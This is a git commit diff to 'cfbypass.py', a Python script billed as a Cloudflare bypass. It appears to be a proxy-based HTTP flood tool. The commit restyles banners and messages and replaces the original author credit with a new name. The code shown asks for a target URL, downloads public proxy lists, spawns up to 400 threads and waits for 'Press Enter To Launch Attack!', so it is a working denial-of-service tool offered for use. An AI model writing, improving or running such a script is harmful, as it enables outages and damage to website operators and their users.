8b012345a5688b59f45f733a8b4d619a88277059
Cardigan <62825248+gitYayo@users.noreply.github.com>
2021-07-11 14:29:05 -0500

    New Cloudflare Bypass
    With Minor Changes!

--- cfbypass.py
+++ cfbypass.py
@@ -5,23 +5,26 @@ import time
 import requests
 import threading
 from colorama import Fore
-print(Fore.YELLOW + """  
-  ____ _____   ______   ______   _    ____ ____
- / ___|  ___| | __ ) \ / /  _ \ / \  / ___/ ___|
-| |   | |_    |  _ \\  V /| |_) / _ \ \___ \___ \ \r
-| |___|  _|   | |_) || | |  __/ ___ \ ___) |__) |
- \____|_|     |____/ |_| |_| /_/   \_\____/____/
+print(Fore.RED + """  
+
+ ██████╗███████╗██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
+██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
+██║     █████╗  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
+██║     ██╔══╝  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
+╚██████╗██║     ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
+ ╚═════╝╚═╝     ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
+                           VERSION 2.0
 """)
-print("Developed by Original COCAINE #Yayo - 07/22/2018")
+print(Fore.YELLOW + "Developed by Max McKinley - 07/11/2021")
 
 def opth():
 	for a in range(thr):
 		x = threading.Thread(target=atk)
 		x.start()
 		print("Threads " + str(a+1) + " Created ")
-	print(Fore.RED + "Wait A Few Seconds For Threads Ready To Attack ...")
+	print(Fore.RED + "Wait A Few Seconds For Threads Ready To Attack...")
 	time.sleep(10)
-	input(Fore.CYAN + "Press Enter To Launch Attack !")
+	input(Fore.CYAN + "Press Enter To Launch Attack!")
 	global oo
 	oo = True
 
@@ -32,27 +35,27 @@ def main():
 	global pprr
 	global thr
 	global per
-	url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
-	ssl = str(input(Fore.GREEN + "Enable SSL Mode ? (y/n) : " + Fore.WHITE))
-	ge = str(input(Fore.GREEN + "Get New Proxies List ? (y/n) : " + Fore.WHITE))
+	url = str(input(Fore.GREEN + "Url: " + Fore.WHITE))
+	ssl = str(input(Fore.GREEN + "Enable SSL Mode? (y/n): " + Fore.WHITE))
+	ge = str(input(Fore.GREEN + "Get New Proxies List? (y/n): " + Fore.WHITE))
 	if ge =='y':
 		if ssl == 'y':
-			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By Original COCAINE
+			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By Max McKinley
 			with open('proxies.txt','wb') as fp:
 				fp.write(rsp.content)
-				print(Fore.CYAN + "Sucess Get Https Proxies List !")
+				print(Fore.CYAN + "API Connection Regarding List Successful!")
 		else:
-			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By Original COCAINE
+			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By Max McKinley
 			with open('proxies.txt','wb') as fp:
 				fp.write(rsp.content)
-				print(Fore.CYAN + "Sucess Get Http Proxies List !")
+				print(Fore.CYAN + "API Connection Regarding List Successful!")
 	else:
 		pass
-	list = str(input(Fore.GREEN + "List (proxies.txt) : " + Fore.WHITE))
+	list = str(input(Fore.GREEN + "List (proxies.txt): " + Fore.WHITE))
 	pprr = open(list).readlines()
-	print(Fore.GREEN + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
-	thr = int(input(Fore.GREEN + "Threads (1-400 Default Is 300) : " + Fore.WHITE))
-	per = int(input(Fore.GREEN + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
+	print(Fore.GREEN + "Proxies Count: " + Fore.WHITE + "%d" %len(pprr))
+	thr = int(input(Fore.GREEN + "Threads (1-400 Default Is 300): " + Fore.WHITE))
+	per = int(input(Fore.GREEN + "CC.Power (1-100 Default Is 70): " + Fore.WHITE))
 	opth()
 
 def atk():
@@ -77,7 +80,7 @@ def atk():
 					s.close()
 			except:
 				s.close()
-				print(Fore.RED + "Can't Connect To Proxies Or Url !")
+				print(Fore.RED + "CANNOT CONNECT PROXIES TO URL!")
 
 
 if __name__ == "__main__":
